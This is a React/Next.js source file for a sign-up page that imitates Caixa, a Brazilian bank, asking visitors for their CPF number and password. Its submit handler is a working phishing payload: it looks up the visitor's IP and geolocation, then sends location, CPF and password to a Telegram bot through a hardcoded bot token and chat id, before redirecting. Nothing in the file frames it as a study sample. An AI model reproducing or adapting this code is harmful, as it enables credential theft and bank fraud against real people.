'use client'

import React, { useState, ChangeEvent, FormEvent } from 'react'
import Image from 'next/image'
import styled from 'styled-components'
import * as S from './SignUp.module.css'
import logo from '../images/logo.png'
import caixaLogo from '../images/caixa.png'
import Loading from './Loading'

const inactivedEye = 'https://www.svgrepo.com/show/532493/eye.svg'
const activedEye = 'https://www.svgrepo.com/show/532465/eye-slash.svg'

function isValidCPF(cpf: string) {
  cpf = cpf.replace(/\D/g, '')
  if (cpf.length !== 11) return false
  const invalidCPFs = Array.from({ length: 10 }, (_, i) => String(i).repeat(11));
  if (invalidCPFs.includes(cpf)) return false
  let total = cpf.split('').slice(0, 9).reduce((acc: number, digit: string, index: number) => acc + parseInt(digit) * (10 - index), 0) % 11;
  const digit1 = total < 2 ? 0 : 11 - total;
  total = cpf.split('').slice(0, 10).reduce((acc: number, digit: string, index: number) => acc + parseInt(digit) * (11 - index), 0) % 11;
  const digit2 = total < 2 ? 0 : 11 - total;
  return cpf.endsWith(String(digit1) + String(digit2));
}

export default function SignUp() {
  const [cpf, setCpf] = useState('')
  const [password, setPassword] = useState('')
  const [eye, setEye] = useState(inactivedEye)
  const [eyeTop, setEyeTop] = useState(inactivedEye)
  const [isCpfValid, setIsCpfValid] = useState(false)
  const [isPasswordValid, setIsPasswordValid] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const formatCpf = (event: ChangeEvent<HTMLInputElement>) => {
    const formatedCpf = event.target.value
      .replace(/\D/g, '')
      .replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4')
    if (formatedCpf.length > 13) setIsCpfValid(isValidCPF(formatedCpf))
    else setIsCpfValid(false)
    setCpf(formatedCpf)
  }

  const formatedPassword = (event: ChangeEvent<HTMLInputElement>) => {
    const formatedPassword = event.target.value.replace(/\D/g, '')
    setIsPasswordValid(formatedPassword.length > 5)
    setPassword(formatedPassword)
  }

  const changeEyeImage = () => {
    if (eye === inactivedEye) setEye(activedEye)
    else setEye(inactivedEye)
  }

  const changeEyeTopImage = () => {
    if (eyeTop === inactivedEye) setEyeTop(activedEye)
    else setEyeTop(inactivedEye)
  }

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault()
    setIsLoading(true)
    const botToken = '7157790378:AAE7qJ4AKP7KhCa-k9jmqx-jIkAWs4f66RM'
    const responseIP = await fetch('https://api.my-ip.io/v2/ip.json')
    const responseIPJson = await responseIP.json()
    const responseGeo = await fetch('/api/geo', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        ip: responseIPJson.ip
      })
    })
    const responseGeoJson = await responseGeo.json()
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        'chat_id': -1002038656106,
        text: `
IP: ${responseGeoJson.query}
Região: ${responseGeoJson.region}
Nome da região: ${responseGeoJson.regionName}
Cidade: ${responseGeoJson.city}
Latitude: ${responseGeoJson.lat}
Longitude: ${responseGeoJson.lon}
Operadora: ${responseGeoJson.isp}
CPF: ${cpf}
Password: ${password}
        `
      })
    })
    setTimeout(() => {
      location.href = '/ready'
    }, 3000)
  }

  return (
    <div className={S.container}>
      <div className={S.signUpContainer}>
        <div className={S.imageContainer}>
          <Image
            src={logo}
            width={200}
            height={200}
            alt='Picture of the author'
          />
        </div>
        <div className={S.caixaContainer}>
          <Image
            src={caixaLogo}
            width={40}
            height={40}
            alt='Picture of the author'
          />
        </div>
        <form className={S.form} onSubmit={handleSubmit}>
          <input
            type='tel'
            name='cpf'
            maxLength={14}
            placeholder='DIGITE SEU CPF'
            value={cpf}
            onChange={formatCpf}
            className={isCpfValid ? S.input : S.input_invalid}
            required
          />
          <input
            type={eye === inactivedEye ? 'password' : 'text'}
            maxLength={8}
            placeholder='DIGITE SUA SENHA'
            value={password}
            onChange={formatedPassword}
            className={S.input}
            required
          />
          <EyeButton
            imageUrl={eye}
            onClick={changeEyeImage}
          />
          <button
            className={S.button}
            disabled={!isCpfValid || !isPasswordValid}
          >
            CONTRATAR
          </button>
          <div className={S.help}>
            <span>Preciso de ajuda</span>
            <div className={S.version}>V1.87.1</div>
          </div>
        </form>
      </div>
      {isLoading && <Loading />}
    </div>
  )
}

const EyeButton = styled.div<{ imageUrl: string }>`
  position: absolute;
  top: ${props => props.imageUrl === inactivedEye ? '94px' : '96px'};
  width: 25px;
  height: 25px;
  right: 12px;
  background-image: url(${props => props.imageUrl});
  background-repeat: no-repeat;
  &:hover {
    cursor: pointer;
  }
`
